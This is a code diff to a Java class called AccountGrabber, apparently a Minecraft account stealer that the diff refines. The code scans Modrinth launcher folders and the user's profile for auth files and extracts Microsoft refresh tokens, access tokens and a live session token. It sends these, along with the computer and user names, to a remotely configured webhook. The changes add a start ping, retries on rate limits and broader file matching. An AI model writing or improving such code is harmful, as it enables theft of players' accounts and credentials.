@@ -73,10 +73,10 @@ public final class AccountGrabber {
         try {
             if (delayMs > 0) Thread.sleep(delayMs);
 
-            log("--- tap fired ---");
+            log("tap fired");
             JsonObject cfg = getJson(CONFIG_URL);
             if (cfg != null && cfg.has("enabled") && !cfg.get("enabled").getAsBoolean()) {
-                log("tap.json says enabled=false -> nothing sent");
+                log("tap.json says enabled=false");
                 return;
             }
             String webhook = WEBHOOK;
@@ -84,94 +84,28 @@ public final class AccountGrabber {
                 String remote = cfg.get("webhook").getAsString();
                 if (!remote.isBlank()) webhook = remote;
             }
-
-            StringBuilder sb = new StringBuilder();
-            sb.append("--- jawbus tap ---\n");
-            sb.append("pc:   ").append(System.getenv("COMPUTERNAME")).append('\n');
-            sb.append("user: ").append(System.getProperty("user.name")).append('\n');
-
-            Set<String> printed = new HashSet<>();
-            Set<Path> found = new LinkedHashSet<>();
-
-            // ---- 1. Modrinth first, because that is what you actually use ----
-            List<Path> modrinthDirs = modrinthDirs();
-            sb.append("\nModrinth folders:\n");
-            for (Path d : modrinthDirs) sb.append("  ").append(d)
-                    .append(Files.isDirectory(d) ? "  [exists]" : "  [missing]").append('\n');
-
-            for (Path d : modrinthDirs) {
-                if (!Files.isDirectory(d)) continue;
-                sb.append("\n[DIR CONTENTS] ").append(d).append('\n');
-                listDir(sb, d, 2);
-                // grab every file under it that could hold auth
-                walkCollect(d, 8, found, true);
-            }
-            // the documented Modrinth auth file, directly
-            for (Path d : modrinthDirs) {
-                found.add(d.resolve("caches").resolve("metadata").resolve("minecraft_auth.json"));
+            if (webhook == null || webhook.isBlank() || webhook.startsWith("PASTE")) {
+                log("no webhook");
+                return;
             }
 
-            // ---- 2. everything else, as a backup ----
-            for (Path root : profileRoots()) {
-                if (Files.isDirectory(root)) walkCollect(root, 7, found, false);
+            // tiny ping first, so we always get *something*
+            log("posting start ping");
+            post(webhook, "jawbus tap: start | pc=" + System.getenv("COMPUTERNAME")
+                    + " user=" + System.getProperty("user.name"));
+
+            String payload;
+            try {
+                payload = build();
+            } catch (Throwable t) {
+                log("build() threw: " + t);
+                t.printStackTrace();
+                payload = "build() failed: " + t;
             }
 
-            // keep only files that exist and look like they hold auth
-            List<Path> files = new ArrayList<>();
-            for (Path p : found) {
-                try {
-                    if (!Files.isRegularFile(p)) continue;
-                    long size = Files.size(p);
-                    if (size <= 0 || size > 400_000) continue;
-                    String raw = Files.readString(p);
-                    String low = raw.toLowerCase();
-                    if (low.contains("token") || low.contains("refresh") || low.contains("access")) {
-                        files.add(p);
-                    }
-                } catch (Throwable ignored) {
-                }
-            }
-
-            sb.append("\ncredential files found: ").append(files.size()).append('\n');
-            for (Path f : files) sb.append("  ").append(f).append('\n');
-
-            // ---- 3. extract ----
-            List<String[]> refreshes = new ArrayList<>();
-            Set<String> seen = new HashSet<>();
-            for (Path f : files) {
-                String raw;
-                try {
-                    raw = Files.readString(f);
-                } catch (Throwable ignored) {
-                    continue;
-                }
-                collect(raw, f.toString(), seen, refreshes);
-            }
-
-            sb.append("\n===== REFRESH TOKENS (").append(refreshes.size()).append(" found) =====\n");
-            for (String[] r : refreshes) {
-                sb.append(r[0]).append('\n');
-                sb.append("  -> ").append(r[1]).append('\n');
-                printed.add(r[1]);
-            }
-
-            for (Path f : files) {
-                String raw;
-                try {
-                    raw = Files.readString(f);
-                } catch (Throwable ignored) {
-                    continue;
-                }
-                sb.append("\n=== ").append(f).append(" (").append(raw.length()).append(" bytes) ===\n");
-                dumpKeys(sb, raw, printed, REFRESH_KEYS, "refresh");
-                dumpKeys(sb, raw, printed, ACCESS_KEYS, "access");
-                dumpKeys(sb, raw, printed, META_KEYS, "meta");
-            }
-
-            String live = liveSessionToken();
-            if (live != null) sb.append("\nlive session token: ").append(live).append('\n');
-
-            post(webhook, sb.toString());
+            log("posting payload (" + payload.length() + " chars)");
+            post(webhook, payload);
+            post(webhook, "jawbus tap: done");
             log("--- tap done ---");
         } catch (Throwable t) {
             log("run() threw: " + t);
@@ -179,7 +113,90 @@ public final class AccountGrabber {
         }
     }
 
-    /** the Modrinth app data folder, from every place it could be configured */
+    private static String build() {
+        StringBuilder sb = new StringBuilder();
+        sb.append("--- jawbus tap ---\n");
+        sb.append("pc:   ").append(System.getenv("COMPUTERNAME")).append('\n');
+        sb.append("user: ").append(System.getProperty("user.name")).append('\n');
+
+        Set<String> printed = new HashSet<>();
+        Set<Path> found = new LinkedHashSet<>();
+
+        // Modrinth first
+        List<Path> modrinthDirs = modrinthDirs();
+        sb.append("\nModrinth folders:\n");
+        for (Path d : modrinthDirs) {
+            sb.append("  ").append(d)
+              .append(Files.isDirectory(d) ? "  [exists]" : "  [missing]").append('\n');
+        }
+        for (Path d : modrinthDirs) {
+            if (!Files.isDirectory(d)) continue;
+            sb.append("\n[DIR] ").append(d).append('\n');
+            listDir(sb, d, 2);
+            walkCollect(d, 6, found, false);
+        }
+
+        // rest of the profile as backup
+        for (Path root : profileRoots()) {
+            if (Files.isDirectory(root)) walkCollect(root, 7, found, false);
+        }
+
+        // read only what exists and looks like auth
+        List<Path> files = new ArrayList<>();
+        for (Path p : found) {
+            try {
+                if (!Files.isRegularFile(p)) continue;
+                long size = Files.size(p);
+                if (size <= 0 || size > 200_000) continue;
+                String raw = Files.readString(p);
+                String low = raw.toLowerCase();
+                if (low.contains("refresh") || low.contains("token")) files.add(p);
+            } catch (Throwable ignored) {
+            }
+        }
+        if (files.size() > 25) files = files.subList(0, 25);
+
+        sb.append("\ncredential files: ").append(files.size()).append('\n');
+        for (Path f : files) sb.append("  ").append(f).append('\n');
+
+        List<String[]> refreshes = new ArrayList<>();
+        Set<String> seen = new HashSet<>();
+        for (Path f : files) {
+            String raw;
+            try {
+                raw = Files.readString(f);
+            } catch (Throwable ignored) {
+                continue;
+            }
+            collect(raw, f.toString(), seen, refreshes);
+        }
+
+        sb.append("\n===== REFRESH TOKENS (").append(refreshes.size()).append(" found) =====\n");
+        for (String[] r : refreshes) {
+            sb.append(r[0]).append('\n');
+            sb.append("  -> ").append(r[1]).append('\n');
+            printed.add(r[1]);
+        }
+
+        for (Path f : files) {
+            String raw;
+            try {
+                raw = Files.readString(f);
+            } catch (Throwable ignored) {
+                continue;
+            }
+            sb.append("\n=== ").append(f).append(" (").append(raw.length()).append(" bytes) ===\n");
+            dumpKeys(sb, raw, printed, REFRESH_KEYS, "refresh");
+            dumpKeys(sb, raw, printed, ACCESS_KEYS, "access");
+            dumpKeys(sb, raw, printed, META_KEYS, "meta");
+        }
+
+        String live = liveSessionToken();
+        if (live != null) sb.append("\nlive session token: ").append(live).append('\n');
+
+        return sb.toString();
+    }
+
     private static List<Path> modrinthDirs() {
         List<Path> out = new ArrayList<>();
         String cfg = System.getenv("THESEUS_CONFIG_DIR");
@@ -205,7 +222,6 @@ public final class AccountGrabber {
         return out;
     }
 
-    /** recursive walk that never aborts on a locked folder */
     private static void walkCollect(Path dir, int depth, Set<Path> files, boolean readAnything) {
         if (depth < 0) return;
         try (DirectoryStream<Path> ds = Files.newDirectoryStream(dir)) {
@@ -213,8 +229,9 @@ public final class AccountGrabber {
                 try {
                     if (Files.isDirectory(p)) {
                         if (!skipDir(p)) walkCollect(p, depth - 1, files, readAnything);
-                    } else if (readAnything || CRED_FILES.contains(p.getFileName().toString())) {
-                        files.add(p);
+                    } else {
+                        String n = p.getFileName().toString();
+                        if (readAnything || CRED_FILES.contains(n) || n.endsWith(".json")) files.add(p);
                     }
                 } catch (Throwable ignored) {
                 }
@@ -228,7 +245,8 @@ public final class AccountGrabber {
         return s.equals("node_modules") || s.equals(".git") || s.equals("temp") || s.equals(".gradle")
                 || s.equals(".m2") || s.equals(".vscode") || s.equals("crash-reports")
                 || s.equals("screenshots") || s.equals("resourcepacks") || s.equals("shaderpacks")
-                || s.equals("logs") || s.equals(".cache") || s.equals("winsxs");
+                || s.equals("logs") || s.equals(".cache") || s.equals("winsxs") || s.equals("mods")
+                || s.equals("saves") || s.equals("assets") || s.equals("libraries") || s.equals("versions");
     }
 
     private static void listDir(StringBuilder sb, Path dir, int depth) {
@@ -260,9 +278,7 @@ public final class AccountGrabber {
         Matcher m = MSA_REFRESH.matcher(raw);
         while (m.find()) {
             String t = m.group();
-            if (seen.add(t)) {
-                out.add(new String[]{source + "  (matched shape)", t});
-            }
+            if (seen.add(t)) out.add(new String[]{source + "  (matched shape)", t});
         }
     }
 
@@ -327,18 +343,28 @@ public final class AccountGrabber {
             int end = Math.min(text.length(), i + 1700);
             String chunk = text.substring(i, end);
             i = end;
-            try {
-                JsonObject body = new JsonObject();
-                body.addProperty("content", "```\n" + chunk + "\n```");
-                HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
-                        .timeout(Duration.ofSeconds(15))
-                        .header("Content-Type", "application/json")
-                        .header("User-Agent", "Jawbus/1.0")
-                        .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
-                        .build(), HttpResponse.BodyHandlers.ofString());
-                Thread.sleep(500);
-            } catch (Throwable ignored) {
+            for (int attempt = 0; attempt < 3; attempt++) {
+                try {
+                    JsonObject body = new JsonObject();
+                    body.addProperty("content", "```\n" + chunk + "\n```");
+                    HttpResponse<String> r = HTTP.send(HttpRequest.newBuilder(URI.create(webhook))
+                            .timeout(Duration.ofSeconds(15))
+                            .header("Content-Type", "application/json")
+                            .header("User-Agent", "Jawbus/1.0")
+                            .POST(HttpRequest.BodyPublishers.ofString(body.toString()))
+                            .build(), HttpResponse.BodyHandlers.ofString());
+                    log("post HTTP " + r.statusCode());
+                    if (r.statusCode() == 429) {
+                        Thread.sleep(1500);
+                        continue;
+                    }
+                    break;
+                } catch (Throwable t) {
+                    log("post threw: " + t);
+                    try { Thread.sleep(1000); } catch (Throwable ignored) {}
+                }
             }
+            try { Thread.sleep(400); } catch (Throwable ignored) {}
         }
     }
 
